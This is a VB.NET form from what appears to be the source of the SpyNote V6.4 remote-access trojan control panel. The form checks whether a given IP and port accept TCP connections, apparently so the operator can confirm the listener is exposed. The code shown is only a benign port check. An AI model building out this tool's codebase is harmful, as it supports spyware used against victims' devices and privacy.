Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class OpenPort
    Private bStat As Boolean

    Private Threading_0 As Thread
    Private Sub aData(ByVal b As Object)
        Dim str As String
        If (Not MyBase.InvokeRequired) Then
            If (Not Conversions.ToBoolean(b)) Then
                Me.Label4.ForeColor = Color.LightCoral
                Me.Label4.Text = "Error: "
                str = String.Concat(New String() {"I could not see your" & vbCrLf & " service on ", Me.textIP.Text, " on port (", Me.textport.Text, ")"})
            Else
                Me.Label4.ForeColor = Color.MediumSeaGreen
                Me.Label4.Text = "Success: "
                str = String.Concat(New String() {"I can see your" & vbCrLf & " service on ", Me.textIP.Text, " on port (", Me.textport.Text, ")"})
            End If
            Me.RichTextBox2.Text = str
            Me.ThemeButton1.Enabled = True
        Else
            MyBase.Invoke(New OpenPort.Delegate0(AddressOf Me.aData), New Object() {RuntimeHelpers.GetObjectValue(b)})
        End If
    End Sub
    Private Sub IsPortOpen(ByVal ar As Array)
        Dim flag As Boolean
        Dim tcpClient As System.Net.Sockets.TcpClient = Nothing
        Try
            Try
                tcpClient = New System.Net.Sockets.TcpClient(Conversions.ToString(ar.GetValue(0)), Conversions.ToInteger(ar.GetValue(1)))
                flag = True
            Catch socketException As System.Net.Sockets.SocketException
                flag = False
            End Try
        Finally
            If (tcpClient IsNot Nothing) Then
                tcpClient.Close()
            End If
        End Try
        Me.aData(flag)
        Me.bStat = False
    End Sub
    Private Sub OpenPort_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        If (Me.bStat) Then
            Me.Threading_0.Abort()
        End If
    End Sub

    Private Sub OpenPort_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\24.ico"))
        Me.textIP.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.textport.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.RichTextBox1.ContextMenuStrip = ContextRicBox.ContextMenuContextRicBox
        Me.RichTextBox2.ContextMenuStrip = ContextRicBox.ContextMenuContextRicBox
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub ThemeButton1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton1.Click
        Me.ThemeButton1.Enabled = False
        If (Not Versioned.IsNumeric(Me.textport.Text.Trim())) Then
            Me.ThemeButton1.Enabled = True
        Else
            Me.Threading_0 = New Thread(Sub(a0 As Object) Me.IsPortOpen(DirectCast(a0, Array)))
            Dim arrays As Array = DirectCast((New String() {Me.textIP.Text.Trim(), Me.textport.Text.Trim()}), Array)
            Me.bStat = True
            Me.Threading_0.Start(arrays)
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Public Delegate Sub Delegate0(ByVal ParametersObject As Object)
End Class